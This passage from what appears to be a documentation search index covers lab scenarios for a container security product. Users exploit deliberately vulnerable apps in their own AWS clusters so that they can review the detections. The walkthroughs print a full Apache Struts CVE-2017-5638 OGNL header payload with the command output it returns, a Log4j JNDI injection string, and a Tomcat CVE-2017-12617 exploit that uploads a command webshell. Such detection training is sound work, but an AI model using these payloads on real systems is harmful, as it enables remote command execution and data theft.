Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/runtime-violations/#overview","title":"Overview","text":"<p>Automated malicious actions are executed every full hour on your cluster which lead to detections in Container Security.</p>"},{"location":"scenarios/eks/runtime-violations/#the-story","title":"The story","text":"<p>There is no real story here :-)</p>"},{"location":"scenarios/eks/runtime-violations/#goals","title":"Goals","text":"<p>Review the detections in Vision One. Check Observed Attack Techniques and Workbenches.</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/","title":"Scenario: Runtime Vulnerability Scanning","text":"<p>DRAFT</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime. The deployments of the scenarios configuration are all based on container images with plenty of different vulnerabilities.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> <li>Proof the finding by exploitation</li> </ul>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#the-story","title":"The story","text":"<p>Every now and then new critical vulnerabilities are disclosed. A famous one with huge impact was the  vulnerability CVE-2017-5638. </p> <p>On March 6th 2017, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This vulnerability allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header. Written in Java, Apache Struts 2 is the popular open source web application framework. This is yet another incident that adds up to a long list of vulnerabilities in this framework.</p> <p>You want to search and validate for this specific vulnerability in your production environment.</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#hints","title":"Hints","text":"Click here  \u2728 Didn't find the vulnerable deployment?  Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c"},{"location":"scenarios/eks/runtime-vulnerability-ec2/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Head over to Attack Surface Risk Managemet and search for the vulnerability CVE-2017-5638  Identify the vulnerable deployment/container  Find out the namespace and metadata.  You'll see that the deployment is running within the `victims` namespace and owns the label `app=java-goof`.  Checking the services in the namespace `victims`   <pre><code>kubectl -n victims get services\n</code></pre>  tells us  <pre><code>NAME                TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE\njava-goof-service   NodePort   172.20.132.99    &lt;none&gt;        8080:30119/TCP   26m\nweb-app-service     NodePort   172.20.121.120   &lt;none&gt;        80:32194/TCP     26m\n</code></pre>  That `java-goof` is reachable on port 8080.  Let's try to verify the vulnerability using the `attacker-cve-2017-5638` pod running in the namespace `attackers`. In your shell run  <pre><code>namespace=\"victims\"\nkubectl exec -n attackers \\\n$(kubectl -n attackers get pods --selector=app=attacker-cve-2017-5638 -o jsonpath='{.items[0].metadata.name}') -- \\\npython3 exploit.py http://java-goof-service.${namespace}:8080 'cat /etc/passwd'\n</code></pre> <pre><code>[*] CVE: 2017-5638 - Apache Struts2 S2-045\n[*] cmd: cat /etc/passwd\n\nb'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n'\n</code></pre>  You proofed that the application server of your little todolist application is vulnerable to CVE-2017-5638.  You may recognize the url `http://java-goof-service.${namespace}:8080` used in the `kubectl` command. Since we're attacking from a pod running on the cluster we can reference the java-goof-service by it's DNS name managed by CoreDNS. The schema for this is `service.namespace`.  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/eks/runtime-vulnerability-fargate/","title":"Scenario: Runtime Vulnerability Scanning on Fargate","text":"<p>DRAFT</p>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS Fargate Cluster </li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> <li>Running app: Nginx</li> </ul> <p>Ensure to have the EKS Fargate Cluster up and running:</p> <pre><code>pgo --apply eks-fg\npgo --apply scenarios-fg\n</code></pre>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime for EKS with Fargate profiles.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> </ul>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#the-story","title":"The story","text":"<p>Here we're checking for the CVE-2021-3711 in OpenSSL with a criticality of 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).</p> <p>You want to search this specific vulnerability in your production environment.</p>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#hints","title":"Hints","text":"Click here  \u2728 Didn't find the vulnerable deployment?  Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c"},{"location":"scenarios/eks/runtime-vulnerability-fargate/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Head over to Attack Surface Risk Managemet and search for the vulnerability CVE-2021-3711  Identify the vulnerable deployment/container.  Find out the node(s) running the pod(s).  <pre><code>kubectl get pods -A -o wide\n</code></pre>  You'll see that the deployment is running within the `default` namespace. The name(s) of the worker nodes start with `fargate-ip-...` which indicate that these nodes are AWS managed Fargate nodes.  Checking the services  <pre><code>kubectl get services\n</code></pre>  tells us  <pre><code>NAME            TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE\nnginx-service   NodePort   172.20.48.60   &lt;none&gt;        80:32443/TCP   26m\n</code></pre>  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/xdr4c/ecs-log4j/","title":"Scenario: Detect JNDI Injection in HTTP Request (Log4j)","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-log4j/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-log4j/#exploit","title":"Exploit","text":"<p>Navigate to http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/todolist</p> <p>Click <code>[Sign in]</code></p> <ul> <li>Username: <code>${jndi:ldap://host.docker.internal:9999/Commons2}</code></li> <li>Password: <code>does not matter</code></li> </ul> <p>Vision One Observed Attack Techniques:</p> <p></p> <p>Note: The currently deployed app is not vulnerable for Log4j, the technique from above still triggers the exploitation attempt.</p>"},{"location":"scenarios/xdr4c/ecs-struts/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-struts/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-struts/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-struts/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-struts/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 18.195.245.32:80...\n* Connected to playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com (18.195.245.32) port 80 (#0)\n&gt; GET /todolist/todolist/ HTTP/1.1\n&gt; Host: playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 \n&lt; Date: Tue, 01 Aug 2023 12:45:58 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; \nLD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\nECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/46de0786-9920-42aa-bff4-c17fd4d273c5\nCATALINA_HOME=/usr/local/tomcat\nLANG=C.UTF-8\nHOSTNAME=ip-10-0-175-104.eu-central-1.compute.internal\n...\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nmessagebus:x:101:101::/var/run/dbus:/bin/false\n* transfer closed with outstanding read data remaining\n* Closing connection 0\ncurl: (18) transfer closed with outstanding read data remaining\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/","title":"Scenario: Detect Tomcat RCE","text":"<p>Requires XDR for Containers</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#checking-if-app-server-is-vulnerable","title":"Checking if app server is vulnerable","text":"<p>Now you can check to see if the tomcat server is vulnerable. If it is you should see something similar to the following:</p> <pre><code>cd ${ONEPATH}/exploits/tomcat-rce/\npython3 exploit.py -u http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n</code></pre> <pre><code>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / \n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /  \n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   \n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/    \n\n[@intx0x80]\n\nPoc Filename  Poc.jsp\nhttp://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com it's Vulnerable to CVE-2017-12617\nhttp://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp\n</code></pre> <p>If you point a browser at http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/Poc.jsp you should get a test page with a bunch of \"A\" char's - that shows the exploit worked.</p> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/ecs-tomcat-rce/#inject-the-exploit-and-run-commands-in-the-container-from-browser","title":"Inject the exploit and run commands in the container from browser","text":"<p>Next, inject the exploit and just hit <code>ENTER</code> at the shell prompt that comes up. (Ignore the error afterward)</p> <pre><code>python3 exploit.py -u http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com -p pwn\n</code></pre> <pre><code>   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\/_ |____  |   /_ |__ \\ / //_ |____  |\n | |     \\ \\  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / \n | |      \\ \\/ / |  __|______/ /| | | || |  / /______| | / / '_ \\| |  / /  \n | |____   \\  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   \n  \\_____|   \\/   |______|  |____|\\___/ |_|/_/        |_|____\\___/|_|/_/    \n\n[@intx0x80]\n\nUploading Webshell .....\n$ \n</code></pre> <p>Either in the shell or from within your browser http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/pwn.jsp test some commands like <code>whoami</code> or <code>dpkg -l</code>.</p> <p>Your browser should present you a blank page with a form containing single field and a <code>Run</code> button. Type any Linux command you want and submit the form. The results will populate the page.</p> <p>Vision One Observed Attack Techniques:</p> <p></p>"},{"location":"scenarios/xdr4c/eks-struts/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":"<p>DRAFT</p>"},{"location":"scenarios/xdr4c/eks-struts/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply eks\npgo --apply scenarios\n</code></pre> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/xdr4c/eks-struts/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/xdr4c/eks-struts/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o scenarios\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>loadbalancer_dns_health_check = \"k8s-goat-healthch-e9104c52db-803985454.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_hunger_check = \"k8s-goat-hungerch-0816ee11b2-1006982801.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_java_goof = \"k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_openssl3 = \"k8s-victims-webappin-8cd6b2fc5e-1459691118.eu-central-1.elb.amazonaws.com\"\nloadbalancer_dns_system_monitor = \"k8s-goat-systemmo-09a16052b6-565756108.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>You want the variable <code>loadbalancer_dns_java_goof</code>.</p>"},{"location":"scenarios/xdr4c/eks-struts/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 3.120.84.56:80...\n* Connected to k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com (3.120.84.56) port 80 (#0)\n&gt; GET /todolist/ HTTP/1.1\n&gt; Host: k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Mon, 11 Sep 2023 07:18:49 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; Server: Apache-Coyote/1.1\n&lt; \nWEB_APP_SERVICE_SERVICE_PORT=80\nKUBERNETES_SERVICE_PORT_HTTPS=443\nTREND_AP_LOG_FILE=STDERR\nJAVA_GOOF_SERVICE_SERVICE_PORT=8080\nKUBERNETES_SERVICE_PORT=443\nWEB_APP_SERVICE_PORT_80_TCP_ADDR=172.20.245.34\nMAVEN_CONFIG=/root/.m2\nMAVEN_PROJECTBASEDIR=/usr/src/goof\nHOSTNAME=java-goof-6c95b8cd5f-qn49h\nMAVEN_CMD_LINE_ARGS=/root/.m2 tomcat7:run\nJAVA_GOOF_SERVICE_PORT_8080_TCP_PORT=8080\n...\n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 OK\n&lt; Date: Mon, 11 Sep 2023 07:18:49 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; Server: Apache-Coyote/1.1\n&lt; \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n* Connection #0 to host k8s-victims-javagoof-2c75b42412-356920097.eu-central-1.elb.amazonaws.com left intact\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p>"}]}